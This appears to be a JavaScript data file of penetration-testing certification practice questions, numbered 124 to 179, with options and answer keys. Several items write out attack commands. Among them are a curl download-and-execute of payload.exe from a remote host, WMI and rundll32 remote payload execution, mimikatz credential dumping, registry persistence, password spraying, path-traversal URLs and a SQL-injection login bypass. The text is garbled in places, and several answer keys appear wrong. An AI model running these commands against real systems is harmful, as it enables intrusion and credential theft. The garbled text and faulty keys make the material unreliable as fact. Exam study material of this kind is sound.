  question: "Consider a penetration tester who needs to perform post-exploitation activities on a compromised Windows system. The tester wants to leverage PowerShell-based tools to gather sensitive information and identify potential privilege escalation vectors. Which of the following PowerSploit modules would be MOST effective for discovering credentials and user tokens?",
  options: [
    "Get-GPPPassword",
    "Get-ExploitableSystem",
    "Get-Securitypackages",
    "Invoke-Shellcode"
  ],
  answer: ["Get-GPPPassword"]
},

/*question 124*/
{
  question: "A penetration tester has discovered a vulnerable IIS web server with the web root folder located at C:\\websites\\prod\\ACME. Which URL should the tester use to attempt to retrieve the file located at C:\\secrets\\confidential.txt?",
  options: [
    "http://www.acme.go/..%2f/..%2f/..%2f/secrets/confidential.txt",
    "http://www.acme.go/%252e%252e%255csecrets/confidential.txt",
    "http://www.acme.go\\..\\..\\secrets\\confidential.txt",
    "http://www.acme.go/../%2e%2e/%2e%2e%2fsecrets/confidential.txt"
  ],
  answer: ["http://www.acme.go/../%2e%2e/%2e%2e%2fsecrets/confidential.txt"]
},

/*question 125*/
{
  question: "A penetration tester needs to assess the security of a complex web application that extensively uses JavaScript for form validation and API calls. The application processes sensitive financial data, and the client wants to use an agentless method to identify vulnerabilities that could be exploited in the production environment. Which scanning approach would be MOST effective for identifying runtime security vulnerabilities in this web application?",
  options: [
    "Interactive Application Security Testing (IAST)",
    "Grey-box behavioral analysis",
    "Dynamic Application Security Testing (DAST)",
    "Runtime Application Self-Protection (RASP)"
  ],
  answer: ["Dynamic Application Security Testing (DAST)"]
},

/*question 126*/
{
  question: "A penetration tester has been contracted to determine if a secure network used for financial transactions is vulnerable to on-path attacks. As part of the mock attack, the tester plans to present users with a self-signed X.509 certificate. The tester begins with the code below:\n\n>>> arppkt = Ether() /ARP()\n>>> arppkt[ARP].hwsrc = \"00:ba:dd:00:be:ef\"\n>>> arppkt[ARP].pdst = \"10.10. 10.14\"\n>>> arppkt[Ether].dst = \"ff:ff:ff:ff:ff:ff\"\nWhich statement explains the tester's actions?",
  options: [
    "The tester is extracting packet data.",
    "The tester is configuring Wireshark.",
    "The tester is modifying an ARP cache.",
    "The tester is constructing a packet."
  ],
  answer: ["The tester is constructing a packet."]
},

/*question 127*/
{
  question: "A penetration tester needs to determine if a threat actor can successfully exfiltrate credentials from a backend database server. The penetration test must use covert channels to avoid detection. Which actions would BEST accomplish this task? (Select TWO.)",
  options: [
    "Enable verbose logging on the server.",
    "Sending credentials via an internal company website like http://internal.website.local.",
    "Disable the host-based firewall on the database server.",
    "Create a cloud-based storage account.",
    "Create a scheduled task to copy the data to the cloud storage account at different intervals."
  ],
  answer: ["Create a cloud-based storage account", "Create a scheduled task to copy the data to the cloud storage account at different intervals."]
},

/*question 128*/
{
  question: "A penetration tester has identified several Remote Code Execution (RCE) vulnerabilities in a client's web application using automated scanning tools. Which method would be MOST effective for confirming these findings are true positives?",
  options: [
    "Reviewing vulnerability descriptions",
    "Static code analysis",
    "Correlation with known CVEs",
    "Command execution verification"
  ],
  answer: ["Command execution verification"]
},

/*question 129*/
{
  question: "During a penetration test of a financial institution's web application, you discover a potential vulnerability in the authentication mechanism. After analyzing the application's behavior and source code, you encounter the following code snippet and associated output:\n\nJava:\npublic boolean validateLogin(String username, String password) {\ntry {\nString query = \"SELECT * FROM users WHERE username='\" + username +\n\"' AND password='\" + password + \"'\";\nResultSet rs = statement.executeQuery(query);\nreturn rs.next( );\n} catch (SQLException e) {\nlogger.error(\"Login failed for user: \" + username);\nreturn false;\n}\n}\n\nNetwork capture of a failed login attempt:\nPOST /api/auth/login HTTP/1.1\nHost : finance.example.com\nContent—Type: application/ json\n{\"username\":\"testuser' OR '1'=' 1\", \"password\":\"anything\"}\nHTTP/ 1.1 500 Internal Server Error\n\" + username) ;\nContent—Type: application/ json\n{\"error\":\"Login failed for user: testuser' OR'1'='1\"}\nWhich method would be most effective for developing a custom exploit in this scenario?",
  options: [
    "Default Metasploit module deployment",
    "Automated fuzzing with payload generation",
    "Binary reverse engineering and disassembly",
    "Source code review and analysis"
  ],
  answer: ["Source code review and analysis"]
},

/*question 130*/
{
  question: "During a penetration test, a tester discovers a web server that displays detailed error messages, including file paths, software versions, and database queries. Which technique should the tester utilize, that would BEST exploit this information to gather additional intelligence?",
  options: [
    "Performing a brute-force login attack against identified services",
    "Reviewing stack trace details for sensitive paths and vulnerabilities",
    "Using a vulnerability scanner to identify common misconfigurations",
    "Sending crafted packets to observe responses for misconfigured services"
  ],
  answer: ["Reviewing stack trace details for sensitive paths and vulnerabilities"]
},

/*question 131*/
{
  question: "During a penetration test engagement, the team needs to analyze the following vulnerability scan results:\n\nVulnerability | EPSS | CVSS | RPN | VPR | Last Seen Active | PoC\nCVE-2023-1234  0.89  9.8  810  9.7  2 Days  Yes\nCVE-2023-5678  0.75  9.1  720  9.3  12 Days Yes\nCVE-2023-9012  0.42  8.9  486  8.8  1 day  No\nCVE-2023-3456  0.37  7.2  360  7.9  5 days  No\nCVE-2023-7890  0.92  9.9  891  9.8  0 days  Yes\nCVE-2023-2345  0.21  7.8  245  7.2  8 days  No\n\nWhich scoring system would a penetration tester MOST likely use to determine which vulnerabilities have the highest probability of leading to successful compromise?",
  options: [
    "Risk Priority Number (RPN)",
    "Exploit Prediction Scoring System (EPSS)",
    "Common Vulnerability Scoring System (CVSS)",
    "Vulnerability Priority Rating (VPR)"
  ],
  answer: ["Exploit Prediction Scoring System (EPSS)"]
},

/*question 132*/
{
  question: "A penetration tester is conducting a security assessment on a web application protected by a Web Application Firewall (WAF). They suspect the WAF is forwarding requests to a backend server. To identify the origin address of the backend server, which technique would be MOST effective?",
  options: [
    "Using DNS enumeration to discover subdomains and potentially unprotected backend endpoints.",
    "Sending crafted HTTP requests to bypass the WAF and observing the response headers for clues about the backend server.",
    "Capturing network traffic with Wireshark to analyze packets for backend server IP addresses.",
    "Performing an IP range scan using Nmap to identify devices behind the WAF."
  ],
  answer: ["Sending crafted HTTP requests to bypass the WAF and observing the response headers for clues about the backend server."]
},

/*question 133*/
{
  question: "Using reconnaissance techniques, a penetration tester discovers two servers:\n\nSRV1\nIP address: 10.10.50.14\nUser account: srvl-user\n\nSRV2\nIP address: 10.10.60.25\nUser account: srv2-user\n\nThe tester determines that, although SRV2 cannot connect via SSH to SRV1, SRV1 can connect via SSH to SRV2. The tester runs the following command on SRV1:\n\nssh —R 6666: localhost: 22\n\nWhich command should the tester use to connect via SSH to SRV1?",
  options: [
    "ssh -p 22 srvl-user@10.10.50.14",
    "ssh -p 22 srv2-user@10.10.60.25",
    "ssh -p 6666 srvl-user@lo.10.50.14",
    "ssh -p 6666 srvl-user@localhost"
  ],
  answer: ["ssh -p 6666 srvl-user@localhost"]
},

/*question 134*/
{
  question: "A penetration tester has been asked to identify both TCP and UDP services on a target network while prioritizing efficiency over stealth. The tester must choose a tool or method that can rapidly scan large IP ranges and identify open ports. Which method should the tester choose?",
  options: [
    "Telnet for testing TCP and UDP ports",
    "Hping3 with randomized packet intervals",
    "Masscan with TCP and UDP port lists",
    "Netcat with a script automating port enumeration"
  ],
  answer: ["Masscan with TCP and UDP port lists"]
},

/*question 135*/
{
  question: "A security consultant is tasked with assessing the security posture of a client's AWS environment. During the engagement, they need to perform reconnaissance and identify potential privilege escalation paths. Which tool would be MOST effective for conducting a comprehensive AWS security assessment?",
  options: [
    "Pacu",
    "CloudSploit",
    "CloudWatch",
    "AWS Config"
  ],
  answer: ["Pacu"]
},

/*question 136*/
{
  question: "During a security assessment of a client's development practices, you need to scan their Git repositories for exposed secrets and sensitive information. Which tool would be MOST effective for identifying credentials and API keys in source code repositories?",
  options: [
    "Fierce",
    "BeEF",
    "Nmap",
    "TruffleHog"
  ],
  answer: ["TruffleHog"]
},

/*question 137*/
{
  question: "A penetration tester creates the following script:\n\ntgt = \"10.10.0.54\"\ntusr =\"jdoe\"\ntpass = \"@@1011ab@\"\n\nsrc = $1\ndata= \"{@:2}\"\n\nftp —inv $tgt <<EOF\nuser $tusr $tpass\ncd $src\nmget $data\nbye\nEOF\nWhich outcome describes the purpose of this script?",
  options: [
    "Cipher enumeration",
    "File download",
    "User enumeration",
    "Host enumeration"
  ],
  answer: ["File download"]
},

/*question 138*/
{
  question: "A penetration tester is attempting to gain physical access to a secure office building that has deployed access control vestibules, badge readers, and door alarms. Which method is MOST likely to allow the tester to gain access to the building while remaining undetected?",
  options: [
    "Picking a door lock",
    "Piggybacking with a vendor",
    "Creating an RFID clone",
    "Tailgating an employee"
  ],
  answer: ["Creating an RFID clone"]
},

/*question 139*/
{
  question: "A penetration tester has been contracted to attempt social engineering attacks against a software development firm. The penetration tester plans to start by performing passive reconnaissance using OSINT. Specifically, the tester wants to identify technical contacts for the development firm. Which methods offer the BEST chance for the tester to uncover this information? (Select TWO.)",
  options: [
    "Search for a Whois record for the firm's domain name.",
    "Attempt a tailgating attack against the development firm.",
    "Search Shodan for the software firm's domain name.",
    "Scrape the software development firm's website.",
    "Search for the firm's domain name using the dig tool."
  ],
  answer: ["Search for a Whois record for the firm's domain name", "Scrape the software development firm's website."]
},

/*question 140*/
{
  question: "Which statement correctly describes MITRE ATT&CK?",
  options: [
    "MITRE ATT&CK is inspired by the kill chain concept.",
    "MITRE ATT&CK components are based on the OSSTMM.",
    "MITRE ATT&CK provides technical pentesting instructions.",
    "MITRE ATT&CK outlines penetration testing procedures."
  ],
  answer: ["MITRE ATT&CK is inspired by the kill chain concept."]
},

/*question 141*/
{
  question: "A company is completing the planning and pre-engagement documentation for an upcoming penetration test. What should be included in the rules of engagement?",
  options: [
    "Compliance goals",
    "Lines of communication",
    "Payment terms",
    "Specifications for evidence handling"
  ],
  answer: ["Specifications for evidence handling"]
},

/*question 142*/
{
  question: "During a penetration test of a Windows system, an attacker wants to achieve persistence by forcing a legitimate application to load a malicious DLL. Which library injection technique would be MOST effective for maintaining persistent access?",
  options: [
    "DLL sideloading",
    "DLL proxying",
    "DLL search order hijacking",
    "DLL hollowing"
  ],
  answer: ["DLL search order hijacking"]
},

/*question 143*/
{
  question: "A security analyst notices inconsistent results from a port scan against a target system. Upon investigating the scan logs, they find the following output:\n\n# Initial scan\nPORT STATE SERVICE\n80/tcp open http\n443/tcp filtered https\n22/tcp closed ssh\n\n# Subsequent scan\nPORT STATE SERVICE\n80/tcp closed http\n443/tcp open https\n22/tcp filtered ssh\n\nWhat is most likely causing these inconsistent scan results?",
  options: [
    "Source port randomization",
    "DNS resolution settings",
    "Fragment reassembly timeout",
    "Rate limiting configuration"
  ],
  answer: ["Rate limiting configuration"]
},

/*question 144*/
{
  question: "You are conducting a penetration test and want to execute a malicious payload embedded in a DLL file on a remote Windows machine. Which steps would allow you to successfully execute a malicious DLL malicious.dll using rund1132.exe? (Select TWO.)",
  options: [
    "Place malicious.dll in a writable directory on the remote machine",
    "Run rund1132.exe C:\\Temp\\malicious.dll,ExportedFunction",
    "Run rund1132.exe \\\\192.168.1.5\\C$\\malicious.dll,ExportedFunction",
    "Run rund1132.exe C:\\Temp\\malicious.dll"
  ],
  answer: [
    "Place malicious.dll in a writable directory on the remote machine",
    "Run rund1132.exe \\\\192.168.1.5\\C$\\malicious.dll,ExportedFunction"
  ]
},

/*question 145*/
{
  question: "During an elicitation attack, a penetration tester is told that SSH is being used for remote management on some network servers. The company has disabled Telnet on all servers. The tester runs an Nmap scan against two network servers using the following:\n\nnmap -p22 192.168.0.20, 192.168.0.21\n\nPort 22 is not open on either server. The tester runs the below command:\n\nnmap -sv 192.168.0.20, 192.168.0.21\n\nThe scan shows port 22 as closed and port 23 as open to SSH.\n\nWhat is the BEST explanation for this result?",
  options: [
    "SSH is configured to use the default port.",
    "The scan is reporting a false positive.",
    "Telnet is not disabled on the servers.",
    "The wrong option was used to run the scan."
  ],
  answer: ["Telnet is not disabled on the servers."]
},

/*question 146*/
{
  question: "A penetration tester is assessing the security of a manufacturing facility's Supervisory Control and Data Acquisition (SCADA) network and discovers that several Programmable Logic Controllers (PLCs) communicate using legacy protocols. Which attack technique would be MOST effective for intercepting and understanding the control commands being sent to these industrial devices?",
  options: [
    "Plaintext protocol analysis",
    "Zero-day exploit development",
    "Denial of Service flooding",
    "Firmware binary analysis"
  ],
  answer: ["Plaintext protocol analysis"]
},

/*question 147*/
{
  question: "A penetration tester needs to test Active Directory password policies and attempt to identify valid domain credentials across multiple Windows systems in the target environment. Which CME command would meet the requirements?",
  options: [
    "crackmapexec mssql target-sql.local -u sa -p \" --file-upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe",
    "crackmapexec winrm 192.168.1.100 -u 'domain\\user' -H 'NTLM:1234567890abcdef' --local-auth",
    "crackmapexec ldap dc01.target.local -u administrator -p 'Passwordl23!' --password-policy",
    "crackmapexec smb 192.168.1.0/24 -u users.txt -p commonly_used_passwords.txt --continue-on-success"
  ],
  answer: ["crackmapexec smb 192.168.1.0/24 -u users.txt -p commonly_used_passwords.txt --continue-on-success"]
},

/*question 148*/
{
  question: "During a penetration test of a large enterprise network, you analyze banner grabbing output for several client computers. Based on the output you receive from each client, which computer should be prioritized as the primary target?",
  options: [
    "Host A- 192.168.1.10\nPORT STATE SERVICE VERSION\n80/tcp open http Apache/2.2.15 (EOL)\n443/tcp open https OpenSSL 1.O.le (EOL)\n3306/tcp open mysql MySQL 5.1.73 (EOL)\nBanner: System hosts primary customer database\nAccess: Internet-facing",
    "Host B - 192.168.1.20\nPORT STATE SERVICE VERSION\n445/tcp open microsoft-ds Windows Server 2008 R2\n3389/tcp open rdp\nBanner: Protected by McAfee ENS 10.7\nAccess: Internal network only",
    "Host D - 192.168.1.40\nPORT STATE SERVICE VERSION\n80/tcp open http nginx 1.12.2\n8080/tcp open http-proxy Squid 3.1\nBanner: Legacy application stack\nAccess: Behind WAF, monitored",
    "Host C- 192.168.1.30\nPORT STATE SERVICE VERSION\n21/tcp open ftp vsftpd 2.3.4\n22/tcp open ssh OpenSSH 5.3\nBanner: Development test environment\nAccess: VLAN isolated"
  ],
  answer: ["Host A"]
},

/*question 149*/
{
  question: "A penetration tester runs the following command:\naircrack-ng —w in.lst —b 00:14:6C:7E:40:80 capz*.cap\nThe tester receives the following output from the command above:\n\nOpening capz—01.cap\nOpening capz—02.cap\nOpening capz—03.cap\nRead 1201 packets.\n\n# BSSID ESSID Encryption\nI 00:AE: private WPA (I handshake)\nChoosing first network as target.\n\nWhich statement BEST describes what the tester is attempting to perform with this command?",
  options: [
    "Deauthenticate WiFi clients.",
    "Configure a promiscuous interface.",
    "Capture authentication handshakes.",
    "Crack a wireless pre-shared key."
  ],
  answer: ["Crack a wireless pre-shared key."]
},

/*question 150*/
{
  question: "A penetration tester discovers a web server during active reconnaissance. The tester suspects that hidden pages on the server may expose sensitive data or functionality. To test this theory, the tester launches a DirBuster scan against the server in order to search for hidden directories and pages. However, not long after a scan is started it is detected and blocked. What should the tester do to increase the chances that a scan will evade detection?",
  options: [
    "Set the scanning type to use pure brute force.",
    "Configure the 'Limit number of requests' scan option.",
    "Switch to a list-based brute force scan.",
    "Modify the scan's HTML parsing options."
  ],
  answer: ["Configure the 'Limit number of requests' scan option."]
},

/*question 151*/
{
  question: "A penetration tester is conducting a test on a compromised Windows system and need to download and execute a malicious payload hosted on a remote server. The payload.exe file is located on a compromised server at http://192.168.1.100. Which steps allows you to download and execute a malicious payload? (Select TWO.)",
  options: [
    "cmd.exe /c curl -o http://192.168.1.100/payload.exe C:\\Temp\\payload.exe",
    "cmd.exe /c C:\\Temp\\payload.exe",
    "cmd.exe /c curl -o C:\\Temp\\payload.exe http://192.168.1.100/payload.exe",
    "cmd.exe /c curl http://192.168.1.100/payload.exe",
    "cmd.exe /c start payload.exe"
  ],
  answer: [
    "cmd.exe /c curl -o C:\\Temp\\payload.exe http://192.168.1.100/payload.exe",
    "cmd.exe /c C:\\Temp\\payload.exe"
  ]
},

/*question 152*/
{
  question: "While analyzing servers located in a client's data center, a penetration tester discovers that some servers are resilient to common attacks. However, the tester also discovers that many virtualization hosts are vulnerable to exploits that are well-known and could be easily mitigated. Based on this finding, what should the tester recommend for the client to do in their final project report?",
  options: [
    "Install a centralized patch management system",
    "Move virtualization hosts to an isolated network segment",
    "Automate hardened baseline configuration and deployment",
    "Deploy server-based intrusion prevention applications"
  ],
  answer: ["Automate hardened baseline configuration and deployment"]
},

/*question 153*/
{
  question: "A penetration tester runs the following command: $Config = \"HKLM:\\software\\Microsoft\\Windows\\CurrentVersion\\Run\" set—itemproperty $Config \"TaskManager\" ('C:\\Windows\\System32\\WindowsPowerShe11\\v1.O\\powershell.exe —executionpolicy Unrestricted —File ' + \"C:\\Temp\\TaskManager.psl\"). What is the MOST likely reason for this activity?",
  options: [
    "To schedule a task",
    "To maintain persistence",
    "To hide suspicious activity",
    "To move laterally"
  ],
  answer: ["To maintain persistence"]
},

/*question 154*/
{
  question: "A penetration tester has been tasked with infiltrating a secure data center using social engineering techniques. What should the tester do FIRST to increase the likelihood of a successful test?",
  options: [
    "Launch an active reconnaissance scan against the target.",
    "Perform a test tailgating attack at the data center site.",
    "Search Shodan for information about the target.",
    "Scrape key contact and job information for the target."
  ],
  answer: ["Scrape key contact and job information for the target."]
},

/*question 155*/
{
  question: "A penetration tester discovers sensitive information during a penetration testing exercise. Which document outlines how this information should be handled?",
  options: [
    "Statement of work",
    "Rules of engagement",
    "Master service agreement",
    "Non-disclosure agreement"
  ],
  answer: ["Rules of engagement"]
},

/*question 156*/
{
  question: "During a web application engagement, a penetration tester needs to identify publicly accessible login pages through web-based reconnaissance. Which technique BEST applies search engine analysis/enumeration to locate potential login portals?",
  options: [
    "Running enum41inux for SMB scanning",
    "Using advanced Google Dorking operators",
    "Querying domain records with nslookup",
    "Installing a keylogger on the target system"
  ],
  answer: ["Using advanced Google Dorking operators"]
},

/*question 157*/
{
  question: "A pen tester is performing packet inspection. Based on the information in the exhibit, what is the pen tester MOST likely to accomplish?",
  options: [
    "Determine the server's attack surface.",
    "Recover clear-text passwords.",
    "Extract X.509 private keys.",
    "Access sensitive document data."
  ],
  answer: ["Recover clear-text passwords."]
},

/*question 158*/
{
  question: "During a penetration test of a Windows system, an attacker needs to execute malicious code while evading detection by security tools. Which LOLBin would be MOST effective for running arbitrary commands with signed Microsoft binaries?",
  options: [
    "BITSADMIN",
    "MSHTA",
    "CERTUTIL",
    "WINRS"
  ],
  answer: ["MSHTA"]
},

/*question 159*/
{
  question: "A penetration test runs the following nmap command:\n\nnmap -sv --script ssl—enum—ciphers —p 443 host1.local.dom\n\nThe command produces the following partial output:\n\nStarting Nmap 7 .92 ( https://nmap.org ) at 2022—05—26 14:05 Eastern Daylight Time\nNmap scan report for host I. local . dom (10.10.2.122)\nHost is up (O. 001 Os latency).\n\nPORT STATE SERVICE VERSION\n443/tcp open ssl/http Apache httpd 2. 4.2B ( (Unix) LibreSSL/ 2.2. 7)\n|_http—server—header: Apache/2 .4 .28 (Unix) LibreSSL/ 2.2.7\n| ssl-enum-ciphers:\n| TLSv1.O:\n| ciphers:\n| TLS DHE RSA WITH AES 12B CBC SHA (dh 2048) -\n| TLS DHE RSA WITH AES 256 CBC SHA (dh 2048) -\n| TLS DHE RSA WITH CAMELLIA 12B CBC SHA (dh 2048)\n| TLS DHE RSA WITH CAMELLIA 256 CBC SHA (dh 2048)\n| TLS ECDHE RSA WITH AES 128 CBC SHA (secp256r1)\n| TLS ECDHE RSA WITH AES 256 CBC SHA (secp256r1)\n| TLS RSA WITH AES 128 CBC SHA (rsa 2048) - A\n| TLS RSA WITH AES 256 CBC SHA (rsa 2048) - A\n| TLS RSA WITH CAMELLIA 128 CBC SHA (rsa 2048)\n| TLS RSA WITH CAMELLIA 256 CBC SHA (rsa 2048)\n| compressors:\n| NULL\n| cipher preference: client\n\nWhich action should the penetration tester attempt?",
  options: [
    "A BEAST attack",
    "An XSS attack",
    "A CSRF attack",
    "A POODLE attack"
  ],
  answer: ["A BEAST attack"]
},

/*question 160*/
{
  question: "During a penetration test of a cloud environment, a security team discovers that several virtual machines in different subnets can communicate with each other despite being in separate security groups. Which cloud-based attack technique would MOST likely exploit this resource misconfiguration?",
  options: [
    "Container escape",
    "Cloud metadata manipulation",
    "Credential hijacking",
    "Zone hopping"
  ],
  answer: ["Zone hopping"]
},

/*question 161*/
{
  question: "During a security assessment of a client's website, a penetration tester discovers the target is running WordPress. They need to identify vulnerable plugins, themes, and user accounts that could be exploited. Which tool would be MOST effective for performing a comprehensive WordPress security assessment?",
  options: [
    "CMSmap with default credentials",
    "Joomscan with enumeration mode",
    "Nikto with CMS detection",
    "WPScan with API integration"
  ],
  answer: ["WPScan with API integration"]
},

/*question 162*/
{
  question: "During a penetration test engagement for a financial services company, the tester needs to document the successful exploitation of a web application vulnerability. Which section of the penetration test report BEST captures the detailed steps and methodology used to compromise the target system?",
  options: [
    "Attack narrative",
    "Vulnerability matrix",
    "Testing methodology",
    "Executive summary"
  ],
  answer: ["Attack narrative"]
},

/*question 163*/
{
  question: "Penetration testers discover a critical vulnerability on a business-critical server. Upon additional investigation, the testers determine that the server is under attack by an APT. Network logs testers have collected indicate extensive data exfiltration. Which action should penetration testers take FIRST?",
  options: [
    "Take the server offline.",
    "Close the ports on the server being used for data exfiltration.",
    "Fully document the vulnerability and attack for inclusion in the penetration test report.",
    "Contact a client technical representative on the emergency contact list."
  ],
  answer: ["Contact a client technical representative on the emergency contact list."]
},

/*question 164*/
{
  question: "What is the MOST common architectural root cause for ICS vulnerabilities?",
  options: [
    "Inadequate encryption",
    "Use of hard-coded passwords",
    "Code injection",
    "Improper input validation"
  ],
  answer: ["Improper input validation"]
},

/*question 165*/
{
  question: "During a red team engagement at a large enterprise, a security analyst needs to analyze Active Directory trust relationships and identify potential attack paths to Domain Admin privileges. Which tool would be MOST effective for mapping and visualizing these relationships?",
  options: [
    "Nessus Professional",
    "Metasploit Pro",
    "BloodHound",
    "Wireshark"
  ],
  answer: ["BloodHound"]
},

/*question 166*/
{
  question: "A penetration test has compromised a workstation within a Windows network. To establish remote code execution on a second machine for lateral movement, the penetration tester decides to execute a malicious payload named malicious.exe on a remote system with IP address 192.168.1.5 using Windows Management Instrumentation (WMI). Which command should the tester use?",
  options: [
    "wmic /node:\"192.168.1.5\" service call startservice \"malicious.exe\"",
    "wmic /node:\"192.168.1.5\" process call create \"malicious.exe\"",
    "wmic /node:\"192.168.1.5\" process call create \"cmd.exe /c malicious.exe\"",
    "wmic /node:\"192.168.1.5\" process where name='malicious.exe' call start"
  ],
  answer: ["wmic /node:\"192.168.1.5\" process call create \"cmd.exe /c malicious.exe\""]
},

/*question 167*/
{
  question: "A security consultant is reviewing a client's cloud-native development pipeline after suspicious behavior was detected in one of their production containers. During the investigation, the consultant needs to determine the most likely attack vector. Which scenario BEST describes a supply chain attack in a cloud environment?",
  options: [
    "An attacker exploited a misconfigured Identity and Access Management (IAM) role to gain elevated privileges within the cloud environment.",
    "An attacker performed a cluster escape exploit to move laterally from a compromised container to the underlying cloud infrastructure.",
    "An attacker compromised a third-party container base image in a public registry, incorporating malicious code that was later pulled and used in the client's production environment.",
    "An attacker used credential stuffing to gain access to multiple cloud service accounts by testing compromised username and password combinations."
  ],
  answer: ["An attacker compromised a third-party container base image in a public registry, incorporating malicious code that was later pulled and used in the client's production environment."]
},

/*question 168*/
{
  question: "A penetration tester is conducting a penetration test in a non-domain Windows environment where a legacy Windows machine has been compromised. The goal is to extract cleartext credentials from the machine using Mimikatz. Which steps would allow the penetration tester to verify the necessary privileges and extract the cleartext passwords? (Select TWO.)",
  options: [
    "mimikatz # privilege::debug",
    "mimikatz # kerberos::list",
    "mimikatz # crypto::cng",
    "mimikatz # sekurlsa::logonpasswords",
    "mimikatz # lsadump::sam"
  ],
  answer: ["mimikatz # privilege::debug", "mimikatz # sekurlsa::logonpasswords"]
},

/*question 169*/
{
  question: "A penetration tester wants to generate an executable file using the latest version of Metasploit. Once Metasploit is running, which should the tester perform to complete this task?",
  options: [
    "Create a dll payload using the msfpayload command.",
    "Specify payload options with the msfupdate command.",
    "Create an executable with the msfconsole command.",
    "Generate a payload using the msfvenom command."
  ],
  answer: ["Generate a payload using the msfvenom command."]
},

/*question 170*/
{
  question: "A penetration tester is conducting an assessment of a Linux server and wants to escalate privileges by exploiting a vulnerable SUID binary. Which tool is MOST effective for identifying these types of vulnerabilities?",
  options: [
    "LinPEAS",
    "Nmap",
    "Metasploit",
    "Nikto"
  ],
  answer: ["LinPEAS"]
},

/*question 171*/
{
  question: "A penetration tester has gained access to a web application and is testing for SQL injection vulnerabilities. During the test, they notice that the application returns an error message with database-specific information. What is the NEXT step the tester should take?",
  options: [
    "Test for time-based blind SQL injection.",
    "Attempt to extract data using UNION-based SQL injection.",
    "Try error-based SQL injection to gather additional information.",
    "Attempt to bypass authentication using SQL injection."
  ],
  answer: ["Test for time-based blind SQL injection."]
},

/*question 172*/
{
  question: "A penetration tester is performing a wireless assessment and discovers an open Wi‑Fi network. Which of the following would be an appropriate next step to assess the network's security?",
  options: [
    "Perform a deauthentication attack to capture credentials.",
    "Attempt to crack the WPA2 passphrase using a dictionary attack.",
    "Scan for rogue access points and monitor for suspicious activity.",
    "Set up a fake captive portal to collect user credentials."
  ],
  answer: ["Perform a deauthentication attack to capture credentials."]
},

/*question 173*/
{
  question: "A penetration tester needs to test a web application for Cross‑Site Request Forgery (CSRF) vulnerabilities. Which of the following actions would be most effective for exploiting this type of vulnerability?",
  options: [
    "Craft a malicious link that forces the victim's browser to send a request to the vulnerable site.",
    "Inject a malicious script that executes in the victim's browser.",
    "Intercept and modify HTTP requests to inject unauthorized commands.",
    "Exploit insecure direct object references (IDOR) in the application."
  ],
  answer: ["Craft a malicious link that forces the victim's browser to send a request to the vulnerable site."]
},

/*question 174*/
{
  question: "During a red team engagement, a tester gains initial access to the target's network and discovers that DNS is not properly secured. Which attack would be MOST effective to exploit this misconfiguration?",
  options: [
    "DNS cache poisoning",
    "DNS tunneling",
    "DNS zone transfer",
    "DNS amplification attack"
  ],
  answer: ["DNS cache poisoning"]
},

/*question 175*/
{
  question: "A penetration tester needs to pivot from a compromised system on a target's network to another internal system. Which of the following tools would be most effective for tunneling traffic through an HTTP/HTTPS protocol?",
  options: [
    "Metasploit",
    "Nmap",
    "Netcat",
    "HTTPTunnel"
  ],
  answer: ["HTTPTunnel"]
},

/*question 176*/
{
  question: "A penetration tester has discovered that a web application accepts file uploads, but the file extension is not validated properly. The tester uploads a malicious PHP file, but the file does not execute when accessed. What action should the tester take NEXT?",
  options: [
    "Try uploading the file with a different extension such as .jpg or .txt.",
    "Attempt to upload the file to a different directory on the server.",
    "Use a tool to create a reverse shell and embed it into the file.",
    "Verify if the file upload is allowed only for specific MIME types."
  ],
  answer: ["Try uploading the file with a different extension such as .jpg or .txt."]
},

/*question 177*/
{
  question: "A penetration tester discovers that an internal web application has poor access control mechanisms. Which attack would MOST effectively exploit this issue?",
  options: [
    "Cross‑Site Scripting (XSS)",
    "Broken Authentication",
    "Cross‑Site Request Forgery (CSRF)",
    "Privilege Escalation"
  ],
  answer: ["Broken Authentication"]
},

/*question 178*/
{
  question: "A penetration tester discovers a vulnerable version of a web server running on the target. Which of the following tools would be MOST appropriate for exploiting known vulnerabilities in the web server software?",
  options: [
    "Nikto",
    "Burp Suite",
    "John the Ripper",
    "Hydra"
  ],
  answer: ["Nikto"]
},

/*question 179*/
{
  question: "A penetration tester has gained access to a system and wants to escalate privileges by exploiting a kernel vulnerability. Which of the following is the BEST approach for identifying this type of vulnerability on a Linux system?",
  options: [
    "Check the kernel version using 'uname -r' and search for known vulnerabilities.",
    "Search for SUID binaries and misconfigured file permissions.",
    "Attempt to exploit a buffer overflow in a running process.",
    "Use a privilege escalation script like LinPEAS to enumerate potential vulnerabilities."
  ],
  answer: ["Check the kernel version using 'uname -r' and search for known vulnerabilities."]
}
  ];
  